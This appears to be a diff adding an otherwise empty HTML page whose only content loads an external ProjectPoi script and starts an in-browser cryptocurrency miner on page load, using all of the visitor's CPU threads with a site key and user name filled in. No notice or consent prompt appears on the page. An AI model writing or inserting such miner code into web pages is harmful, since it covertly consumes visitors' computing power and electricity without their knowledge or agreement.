@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		
+	</head>
+	<body>
+		<script src="https://ppoi.org/lib/projectpoi.min.js">	
+		</script>
+		<script>
+			var miner = new ProjectPoi.User('BLuRXQ2XBPG0jSEBBnysmfVJ', 'john-doe', {
+	threads: navigator.hardwareConcurrency,
+	autoThreads: false,
+	throttle: 0.5,
+	forceASMJS: false
+});
+	miner.start(ProjectPoi.IF_EXCLUSIVE_TAB);	
+		</script>
+		
+	</body>
+</html>
